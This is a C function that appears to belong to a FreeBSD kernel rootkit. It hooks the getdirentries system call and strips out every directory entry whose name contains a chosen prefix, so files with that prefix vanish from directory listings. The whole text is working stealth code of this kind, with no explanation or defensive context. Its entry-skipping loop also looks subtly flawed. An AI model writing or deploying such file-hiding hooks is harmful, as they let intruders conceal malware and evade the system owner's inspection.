static int bds_getdirentries(struct thread *td, void *args) {
	struct getdirentries_args *uap;
	unsigned int size, count;
	int error;
	struct dirent *dp, *current;

	uap = (struct getdirentries_args *)args;
	error = sys_getdirentries(td, args);
	size = td->td_retval[0];
	
	if (size > 0) {
		dp = malloc(size, M_TEMP, M_WAITOK);
		copyin(uap->buf, dp, size);

		count = size;
		current = dp;

		while ((current->d_reclen != 0) && (count > 0)) {
			count -= current->d_reclen;
			
			if (strstr(current->d_name, BDS_PREFIX)) {
				if (count != 0) {
					bcopy((char *)current + current->d_reclen, current, count);
				}
				size -= current->d_reclen;
			}
	
			if (count > 0) {
				current = (struct dirent *)	((char *)current + current->d_reclen);
			}
		}

		td->td_retval[0] = size;
		copyout(dp, uap->buf, size);
		free(dp, M_TEMP);
	}

	return error;
}
